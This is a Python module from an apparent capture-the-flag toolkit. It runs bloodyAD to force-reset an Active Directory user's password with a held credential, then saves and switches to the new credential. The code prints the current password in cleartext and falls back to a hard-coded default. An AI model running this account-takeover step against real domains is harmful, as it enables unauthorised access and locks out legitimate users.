import subprocess

from core.target import target_add_cred, target_set_cred


DEFAULT_PASSWORD = "NewPass123!"


def run(data, cred, args):
    """
    Change password of a domain user using bloodyAD.

    Usage:
        ctf ad.changepass michael newpass
        ctf ad.changepass michael
    """

    # -------------------------
    # Parse arguments
    # -------------------------
    target_user = None
    new_password = None

    extra = getattr(args, "extra", []) or []

    if len(extra) >= 1:
        target_user = extra[0]

    if len(extra) >= 2:
        new_password = extra[1]

    if not target_user:
        print("[-] Missing target user")
        return data

    if not new_password:
        new_password = DEFAULT_PASSWORD
        print(f"[*] No password provided, using default: {new_password}")

    # -------------------------
    # Resolve target info
    # -------------------------
    ip = data.get("ip")
    domain = data.get("domain")

    # fallback if needed
    if not domain:
        domains = data.get("domains", [])
        if domains:
            domain = domains[0]

    if not ip:
        print("[-] Target missing IP")
        return data

    if not domain:
        print("[-] No domain set (use: ctf target add-domain --domain <domain>)")
        return data

    # -------------------------
    # Validate + normalize credential
    # -------------------------
    if not cred:
        print("[-] No active credential")
        return data

    username = cred.get("username") or cred.get("user")

    password = (
        cred.get("password") or
        (cred.get("secret") if cred.get("type") == "password" else None)
    )

    if not username:
        print("[-] Invalid credential (missing username)")
        return data

    if not password:
        print("[-] Current credential is not password-based (hash/aes not supported yet)")
        return data

    # -------------------------
    # Build command
    # -------------------------
    cmd = [
        "bloodyAD",
        "--host", ip,
        "-d", domain,
        "-u", username,
        "-p", password,
        "set", "password",
        target_user,
        new_password
    ]

    print(f"[*] Running: {' '.join(cmd)}")

    # -------------------------
    # Execute
    # -------------------------
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True
        )
    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return data

    output = result.stdout + result.stderr

    # -------------------------
    # Detect success
    # -------------------------
    if "success" in output.lower() or "changed" in output.lower():
        print("[+] Password changed")

        # -------------------------
        # Add credential
        # -------------------------
        new_cred = {
            "user": target_user,
            "type": "password",
            "secret": new_password
        }


        import argparse

        target_add_cred(
            argparse.Namespace(
                user=target_user,
                password=new_password,
                hash=None,
                aes=None,
                ccache=None
            )
        )

        # -------------------------
        # Switch active credential
        # -------------------------
        import argparse

        target_set_cred(
            argparse.Namespace(
                identifier=target_user
            )
        )

    else:
        print("[-] Password change may have failed")
        print(output)

    from core.target import load_current_profile

    data, _ = load_current_profile()
    return data
